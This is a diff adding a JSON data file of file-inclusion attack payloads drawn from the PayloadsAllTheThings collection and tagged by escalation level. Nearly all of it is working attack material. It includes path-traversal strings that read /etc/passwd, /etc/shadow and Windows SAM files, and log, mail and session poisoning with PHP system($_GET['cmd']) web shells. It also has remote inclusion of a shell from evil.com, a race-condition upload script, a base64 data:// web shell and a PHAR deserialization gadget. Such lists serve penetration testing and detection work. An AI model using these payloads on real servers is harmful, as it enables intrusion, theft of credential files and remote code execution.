@@ -1,0 +1,324 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "file_inclusion",
+  "original_category": "File Inclusion",
+  "payloads": [
+    {
+      "category": "LFI to RCE via /proc/*/fd",
+      "escalation": "baseline",
+      "lines": [
+        "http://example.com/index.php?page=/proc/$PID/fd/$FD"
+      ]
+    },
+    {
+      "category": "LFI to RCE via /proc/self/environ",
+      "escalation": "baseline",
+      "lines": [
+        "GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1",
+        "User-Agent: <?=phpinfo(); ?>"
+      ]
+    },
+    {
+      "category": "LFI to RCE via upload",
+      "escalation": "baseline",
+      "lines": [
+        "http://example.com/index.php?page=path/to/uploaded/file.png"
+      ]
+    },
+    {
+      "category": "LFI to RCE via upload (race)",
+      "escalation": "baseline",
+      "lines": [
+        "import itertools",
+        "import requests",
+        "import sys",
+        "print('[+] Trying to win the race')",
+        "f = {'file': open('shell.php', 'rb')}",
+        "for _ in range(4096 * 4096):",
+        "requests.post('http://target.com/index.php?c=index.php', f)",
+        "print('[+] Bruteforcing the inclusion')",
+        "for fname in itertools.combinations(string.ascii_letters + string.digits, 6):",
+        "url = 'http://target.com/index.php?c=/tmp/php' + fname",
+        "r = requests.get(url)",
+        "if 'load average' in r.text:  # <?php echo system('uptime');",
+        "print('[+] We have got a shell: ' + url)",
+        "sys.exit(0)",
+        "print('[x] Something went wrong, please try again')"
+      ]
+    },
+    {
+      "category": "LFI to RCE via controlled log file",
+      "escalation": "baseline",
+      "lines": [
+        "http://example.com/index.php?page=/var/log/apache/access.log",
+        "http://example.com/index.php?page=/var/log/apache/error.log",
+        "http://example.com/index.php?page=/var/log/apache2/access.log",
+        "http://example.com/index.php?page=/var/log/apache2/error.log",
+        "http://example.com/index.php?page=/var/log/nginx/access.log",
+        "http://example.com/index.php?page=/var/log/nginx/error.log",
+        "http://example.com/index.php?page=/var/log/vsftpd.log",
+        "http://example.com/index.php?page=/var/log/sshd.log",
+        "http://example.com/index.php?page=/var/log/mail",
+        "http://example.com/index.php?page=/var/log/httpd/error_log",
+        "http://example.com/index.php?page=/usr/local/apache/log/error_log",
+        "http://example.com/index.php?page=/usr/local/apache2/log/error_log"
+      ]
+    },
+    {
+      "category": "RCE via SSH",
+      "escalation": "baseline",
+      "lines": [
+        "ssh <?php system($_GET[\"cmd\"]);?>@10.10.10.10",
+        "http://example.com/index.php?page=/var/log/auth.log&cmd=id"
+      ]
+    },
+    {
+      "category": "RCE via Mail",
+      "escalation": "baseline",
+      "lines": [
+        "root@kali:~# telnet 10.10.10.10. 25",
+        "Trying 10.10.10.10....",
+        "Connected to 10.10.10.10..",
+        "Escape character is '^]'.",
+        "220 straylight ESMTP Postfix (Debian/GNU)",
+        "helo ok",
+        "250 straylight",
+        "mail from: mail@example.com",
+        "250 2.1.0 Ok",
+        "rcpt to: root",
+        "250 2.1.5 Ok",
+        "data",
+        "354 End data with <CR><LF>.<CR><LF>",
+        "subject: <?php echo system($_GET[\"cmd\"]); ?>",
+        "data2",
+        ".",
+        "mail -s \"<?php system($_GET['cmd']);?>\" www-data@10.10.10.10. < /dev/null"
+      ]
+    },
+    {
+      "category": "RCE via Apache logs",
+      "escalation": "baseline",
+      "lines": [
+        "curl http://example.org/ -A \"<?php system(\\$_GET['cmd']);?>\"",
+        "curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id"
+      ]
+    },
+    {
+      "category": "LFI to RCE via PHP sessions",
+      "escalation": "baseline",
+      "lines": [
+        "Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/",
+        "Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly",
+        "/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.",
+        "user_ip|s:0:\"\";loggedin|s:0:\"\";lang|s:9:\"en_us.php\";win_lin|s:0:\"\";user|s:6:\"admin\";pass|s:6:\"admin\";",
+        "login=1&user=<?php system(\"cat /etc/passwd\");?>&pass=password&lang=en_us.php",
+        "login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27"
+      ]
+    },
+    {
+      "category": "LFI to RCE via PHP PEARCMD",
+      "escalation": "baseline",
+      "lines": [
+        "register_argc_argv = On"
+      ]
+    },
+    {
+      "category": "Windows version",
+      "escalation": "baseline",
+      "lines": [
+        "http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam",
+        "http://example.com/index.php?page=../../../../../../WINDOWS/repair/system"
+      ]
+    },
+    {
+      "category": "Linux version",
+      "escalation": "baseline",
+      "lines": [
+        "http://example.com/index.php?page=../../../../../../etc/shadow"
+      ]
+    },
+    {
+      "category": "Local File Inclusion",
+      "escalation": "baseline",
+      "lines": [
+        "<?php",
+        "$file = $_GET['page'];",
+        "include($file);",
+        "?>",
+        "http://example.com/index.php?page=../../../etc/passwd"
+      ]
+    },
+    {
+      "category": "Null Byte",
+      "escalation": "baseline",
+      "lines": [
+        "http://example.com/index.php?page=../../../etc/passwd%00",
+        "{{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00"
+      ]
+    },
+    {
+      "category": "Double Encoding",
+      "escalation": "baseline",
+      "lines": [
+        "http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd",
+        "http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00"
+      ]
+    },
+    {
+      "category": "UTF-8 Encoding",
+      "escalation": "baseline",
+      "lines": [
+        "http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+        "http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00"
+      ]
+    },
+    {
+      "category": "Path Truncation",
+      "escalation": "baseline",
+      "lines": [
+        "http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]",
+        "http://example.com/index.php?page=../../../etc/passwd\\.\\.\\.\\.\\.\\.[ADD MORE]",
+        "http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE]",
+        "http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd"
+      ]
+    },
+    {
+      "category": "Filter Bypass",
+      "escalation": "aggressive",
+      "lines": [
+        "http://example.com/index.php?page=....//....//etc/passwd",
+        "http://example.com/index.php?page=..///////..////..//////etc/passwd",
+        "http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"
+      ]
+    },
+    {
+      "category": "Remote File Inclusion",
+      "escalation": "aggressive",
+      "lines": [
+        "allow_url_include = On",
+        "http://example.com/index.php?page=http://evil.com/shell.txt"
+      ]
+    },
+    {
+      "category": "Null Byte",
+      "escalation": "aggressive",
+      "lines": [
+        "http://example.com/index.php?page=http://evil.com/shell.txt%00"
+      ]
+    },
+    {
+      "category": "Double Encoding",
+      "escalation": "aggressive",
+      "lines": [
+        "http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt"
+      ]
+    },
+    {
+      "category": "Wrapper php://filter",
+      "escalation": "baseline",
+      "lines": [
+        "http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php",
+        "http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
+        "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php",
+        "http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php",
+        "http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
+        "./kadimus -u \"http://example.com/index.php?page=vuln\" -S -f \"index.php%00\" -O index.php --parameter page",
+        "curl \"http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\" | base64 -d > index.php"
+      ]
+    },
+    {
+      "category": "Wrapper data://",
+      "escalation": "baseline",
+      "lines": [
+        "http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="
+      ]
+    },
+    {
+      "category": "Wrapper expect://",
+      "escalation": "baseline",
+      "lines": [
+        "http://example.com/index.php?page=expect://id",
+        "http://example.com/index.php?page=expect://ls"
+      ]
+    },
+    {
+      "category": "Wrapper input://",
+      "escalation": "baseline",
+      "lines": [
+        "curl -X POST --data \"<?php echo shell_exec('id'); ?>\" \"https://example.com/index.php?page=php://input%00\" -k -v",
+        "./kadimus -u \"https://example.com/index.php?page=php://input%00\"  -C '<?php echo shell_exec(\"id\"); ?>' -T input"
+      ]
+    },
+    {
+      "category": "PHAR deserialization",
+      "escalation": "baseline",
+      "lines": [
+        "class AnyClass {",
+        "public $data = null;",
+        "public function __construct($data) {",
+        "$this->data = $data;",
+        "}",
+        "function __destruct() {",
+        "system($this->data);",
+        "}",
+        "}",
+        "...",
+        "echo file_exists($_GET['page']);",
+        "// create new Phar",
+        "$phar = new Phar('deser.phar');",
+        "$phar->startBuffering();",
+        "$phar->addFromString('test.txt', 'text');",
+        "$phar->setStub('<?php __HALT_COMPILER(); ?>');",
+        "// add object of any class as meta data",
+        "class AnyClass {",
+        "public $data = null;",
+        "public function __construct($data) {",
+        "$this->data = $data;",
+        "}",
+        "function __destruct() {",
+        "system($this->data);",
+        "}",
+        "}",
+        "$object = new AnyClass('whoami');",
+        "$phar->setMetadata($object);",
+        "$phar->stopBuffering();",
+        "$phar->setStub(\"\\xff\\xd8\\xff\\n<?php __HALT_COMPILER(); ?>\");"
+      ]
+    },
+    {
+      "category": "Leak file content from error-based oracle",
+      "escalation": "baseline",
+      "lines": [
+        "$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0",
+        "[*] The following URL is targeted : http://127.0.0.1",
+        "[*] The following local file is leaked : /test",
+        "[*] Running POST requests",
+        "[+] File /test leak is finished!"
+      ]
+    },
+    {
+      "category": "Leak file content inside a custom format output",
+      "escalation": "baseline",
+      "lines": [
+        "./wrapwrap.py /etc/passwd 'PREFIX' 'SUFFIX' 1000",
+        "./wrapwrap.py /etc/passwd '{\"message\":\"' '\"}' 1000",
+        "./wrapwrap.py /etc/passwd '<root><name>' '</name></root>' 1000",
+        "<?php",
+        "$data = file_get_contents($_POST['url']);",
+        "$data = json_decode($data);",
+        "echo $data->message;",
+        "?>"
+      ]
+    },
+    {
+      "category": "Leak file content using blind file read primitive",
+      "escalation": "baseline",
+      "lines": [
+        "code remote.py # edit Remote.oracle",
+        "./lightyear.py test # test that your implementation works",
+        "./lightyear.py /etc/passwd # dump a file!"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.870Z"
+}
